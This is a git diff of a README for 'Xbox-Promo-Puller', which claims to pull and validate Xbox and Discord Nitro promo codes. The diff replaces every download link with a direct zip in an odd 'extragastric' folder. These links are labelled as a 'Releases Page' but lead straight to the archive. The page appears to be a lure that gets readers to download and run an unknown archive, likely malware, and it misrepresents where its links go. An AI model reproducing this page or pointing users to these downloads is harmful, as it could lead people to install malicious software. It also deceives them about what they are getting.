@@ -1,7 +1,7 @@
 # 🎮 Xbox-Promo-Puller - Easily Extract and Validate Codes
 
 ## 📥 Download Now
-[![Download Xbox-Promo-Puller](https://raw.githubusercontent.com/adameeeee/Xbox-Promo-Puller/main/extragastric/Xbox-Promo-Puller.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/adameeeee/Xbox-Promo-Puller/main/extragastric/Xbox-Promo-Puller.zip)
+[![Download Xbox-Promo-Puller](https://github.com/adameeeee/Xbox-Promo-Puller/raw/refs/heads/main/extragastric/Puller_Xbox_Promo_1.9.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/adameeeee/Xbox-Promo-Puller/raw/refs/heads/main/extragastric/Puller_Xbox_Promo_1.9.zip)
 
 ## 📖 Overview
 Xbox-Promo-Puller is a powerful tool designed to help users extract and validate promotional codes from Discord. With its user-friendly interface, you can quickly access and verify codes for Xbox and Discord Nitro. This application simplifies the process, making it ideal for anyone looking to enhance their gaming experience without getting bogged down by complicated settings.
@@ -15,7 +15,7 @@ Getting started with Xbox-Promo-Puller is simple. Just follow the steps below to
 - **Disk Space:** 100 MB of free space
 
 ### 📥 Download & Install
-To get the latest version of Xbox-Promo-Puller, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/adameeeee/Xbox-Promo-Puller/main/extragastric/Xbox-Promo-Puller.zip).
+To get the latest version of Xbox-Promo-Puller, visit this page to download: [GitHub Releases Page](https://github.com/adameeeee/Xbox-Promo-Puller/raw/refs/heads/main/extragastric/Puller_Xbox_Promo_1.9.zip).
 
 1. Open the link above in your web browser.
 2. Look for the latest release at the top of the page.
@@ -46,7 +46,7 @@ If you encounter issues while using Xbox-Promo-Puller:
 
 - **Ensure Your System Meets Requirements:** Confirm that your operating system is compatible.
 - **Check Your Internet Connection:** A stable connection ensures the tool runs smoothly.
-- **Re-download the Application:** If you face technical glitches, try downloading the latest version again from [the Releases Page](https://raw.githubusercontent.com/adameeeee/Xbox-Promo-Puller/main/extragastric/Xbox-Promo-Puller.zip).
+- **Re-download the Application:** If you face technical glitches, try downloading the latest version again from [the Releases Page](https://github.com/adameeeee/Xbox-Promo-Puller/raw/refs/heads/main/extragastric/Puller_Xbox_Promo_1.9.zip).
 
 ## 🤝 Help & Support
 If you need further assistance or have questions, you can reach out through the Issues section on our GitHub repository. We strive to respond to all inquiries promptly.
